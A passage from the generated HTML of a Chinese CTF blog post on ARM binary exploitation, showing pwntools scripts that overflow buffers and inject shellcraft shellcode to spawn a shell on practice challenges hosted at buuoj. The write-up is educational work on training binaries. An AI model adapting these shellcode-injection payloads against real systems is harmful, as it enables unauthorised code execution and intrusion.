class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28102</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">print(<span class="built_in">hex</span>(elf.bss() + <span class="number">0x300</span>))</span><br><span class="line">pause()</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x64</span> + p32(elf.bss() + <span class="number">0x300</span>) + p32(<span class="number">0x0010364</span>) + p32(elf.bss() + <span class="number">0x300</span>) + p32(<span class="number">0x0010530</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to bi0s CTF!&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(p32(elf.bss() + <span class="number">0x304</span>) + shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="root-me-stack-buffer-overflow-basic"><a href="#root-me-stack-buffer-overflow-basic" class="headerlink" title="root_me_stack_buffer_overflow_basic"></a>root_me_stack_buffer_overflow_basic</h3><p>看上去乱七八糟，跑一下发现随便输东西还给地址，那直接shellcode跳过去完事。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;arm&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;qemu-arm&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabihf/&quot;, &quot;./pwn&quot;])</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27512</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">&#x27;dump:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;:&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;(y/n):\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;dump:&#x27;</span>)</span><br><span class="line">payload =shellcode.ljust(<span class="number">0xA4</span>, <span class="string">b&#x27;\x90&#x27;</span>) + p32(addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;(y/n):\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="root-me-stack-spraying"><a href="#root-me-stack-spraying" class="headerlink" title="root_me_stack_spraying"></a>root_me_stack_spraying</h3>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/25/2021/setcontext%E5%AD%A6%E4%B9%A0/" rel="prev" title="setcontext学习">
+      <i class="fa fa-chevron-left"></i> setcontext学习
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/05/16/2021/ciscn2021/" rel="next" title="ciscn2021">
+      ciscn2021 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#arm-learning"><span class="nav-number">1.</span> <span class="nav-text">arm-learning</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="nav-number">3.</span> <span class="nav-text">相关知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8%E8%A7%84%E5%88%99"><span class="nav-number">3.1.</span> <span class="nav-text">寄存器规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%A0%E5%8F%82%E8%A7%84%E5%88%99"><span class="nav-number">3.2.</span> <span class="nav-text">传参规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%94%E5%9B%9E%E5%80%BC%E8%A7%84%E5%88%99"><span class="nav-number">3.3.</span> <span class="nav-text">返回值规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BF%E5%9D%80%E8%A7%84%E5%88%99"><span class="nav-number">3.4.</span> <span class="nav-text">访址规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AArch64-%E6%9E%B6%E6%9E%84"><span class="nav-number">3.5.</span> <span class="nav-text">AArch64 架构</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">4.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvisoj-typo"><span class="nav-number">4.1.</span> <span class="nav-text">jarvisoj_typo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2018-%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-baby-arm"><span class="nav-number">4.2.</span> <span class="nav-text">2018 上海市大学生网络安全大赛 - baby_arm</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#inctf2018-wARMup"><span class="nav-number">4.3.</span> <span class="nav-text">inctf2018_wARMup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#root-me-stack-buffer-overflow-basic"><span class="nav-number">4.4.</span> <span class="nav-text">root_me_stack_buffer_overflow_basic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#root-me-stack-spraying"><span class="nav-number">4.5.</span> <span class="nav-text">root_me_stack_spraying</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="DaiDai"
+      src="/images/me.jpg">
+  <p class="site-author-name" itemprop="name">DaiDai</p>
+  <div class="site-description" itemprop="description">never stop learning</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://m3wsec.github.io/" title="http:&#x2F;&#x2F;m3wsec.github.io" rel="noopener" target="_blank">m3w</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.csdn.net/qq_46091464" title="https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_46091464" rel="noopener" target="_blank">Firebasky</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/erR0Ratao" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;erR0Ratao" rel="noopener" target="_blank">atao</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.d1a0.cn/" title="https:&#x2F;&#x2F;www.d1a0.cn&#x2F;" rel="noopener" target="_blank">d1a0</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/anweilx/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;anweilx&#x2F;" rel="noopener" target="_blank">anweilx</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://me.csdn.net/Kroner" title="https:&#x2F;&#x2F;me.csdn.net&#x2F;Kroner" rel="noopener" target="_blank">No</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.csdn.net/Amherstieae" title="https:&#x2F;&#x2F;blog.csdn.net&#x2F;Amherstieae" rel="noopener" target="_blank">beta</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.y4tacker.top/" title="http:&#x2F;&#x2F;blog.y4tacker.top" rel="noopener" target="_blank">Y4tacker</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://yq1ng.github.io/" title="http:&#x2F;&#x2F;yq1ng.github.io" rel="noopener" target="_blank">yq1ng</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://snowywar.top/wordpress" title="http:&#x2F;&#x2F;snowywar.top&#x2F;wordpress" rel="noopener" target="_blank">snowy</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.sy4.top/" title="https:&#x2F;&#x2F;www.sy4.top&#x2F;" rel="noopener" target="_blank">picnic</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://justloseit.top/" title="http:&#x2F;&#x2F;justloseit.top&#x2F;" rel="noopener" target="_blank">Joker</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://s0uthwood.github.io/" title="https:&#x2F;&#x2F;s0uthwood.github.io&#x2F;" rel="noopener" target="_blank">s0uthwood</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://kfxp12138.github.io/" title="https:&#x2F;&#x2F;kfxp12138.github.io&#x2F;" rel="noopener" target="_blank">triplewing</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">DaiDai</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">197k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:59</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
